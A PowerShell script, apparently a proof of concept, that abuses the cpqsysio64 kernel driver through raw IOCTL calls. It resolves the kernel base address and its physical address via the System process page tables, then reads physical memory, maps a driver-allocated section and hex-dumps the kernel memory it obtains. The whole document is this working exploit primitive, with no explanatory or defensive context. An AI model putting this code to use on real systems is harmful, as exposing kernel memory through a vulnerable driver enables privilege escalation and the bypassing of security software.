Clear-Host
Write-Host

$hDevice = Get-FileHandle -FileName cpqsysio64 -AlternativeName cpqsysio
$VA      = Get-KernelBaseAddress
$PA      = Resolve-DirectoryTable -VA64 $VA -ProcessID 4

try {
  $ReadSize = 96
  if ($ReadSize -lt 0x10) {
    $Size = 0x10
  } else {
    $Size = $ReadSize
  }
  
  # 0. Fixed: Use correct unmap IOCTL code 0x153E84 (1392260) to clear BaseAddress
  $cleanBuffer = New-IntPtr -Size 32
  Invoke-IoctlCall -Mode 0 -FileHandle $hDevice -IoCtrlCode 0x153E84 -InOutPtr $cleanBuffer -InputSize 32 -OutputSize 32 | Out-Null

  # Original Case: Physical Read (0x152EF0)
  $buffer = New-IntPtr -Size $Size -TypeSize ([Int64], [Int32]) -Values ($PA, $ReadSize)
  Invoke-IoctlCall -Mode 0 -FileHandle $hDevice -IoCtrlCode 0x152EF0 -InOutPtr $buffer -InputSize $Size -OutputSize $ReadSize | Out-Null
  
  Write-Host "[+] Physical Read Results:"
  Format-HexView -Address $buffer -Size $ReadSize

  Write-Host ""

  # New Case: Section Allocation & Mapping (0x153E80)
  $MapSize = 0x1000
  $mapBuffer = New-IntPtr -Size 32 -TypeSize ([Int32]) -Values ($MapSize)
  $mapSuccess = Invoke-IoctlCall -Mode 0 -FileHandle $hDevice -IoCtrlCode 0x153E80 -InOutPtr $mapBuffer -InputSize 32 -OutputSize 32 | select -ExpandProperty Success
  
  Write-Host "[+] Section Mapping Success: $mapSuccess"
  Write-Host "[+] Section Mapping Results:"
  
  $MapAddress = [Marshal]::ReadIntPtr($mapBuffer, 0x10)
  if ($MapAddress -ne [IntPtr]::Zero) {
    Write-Host
    Read-VirtualAddress -VA $MapAddress -BlockSize 32 | Format-HexView -Mode 8x
  }

  $MapAddress = [Marshal]::ReadIntPtr($mapBuffer, 0x18)
  if ($MapAddress -ne [IntPtr]::Zero) {
    Write-Host
    Format-HexView -Address $MapAddress -Size 32 -Mode 8x
  }
}
finally {
  Free-IntPtr $cleanBuffer -Method Auto
  Free-IntPtr $buffer      -Method Auto
  Free-IntPtr $mapBuffer   -Method Auto
}

Free-IntPtr $hDevice -Method NtHandle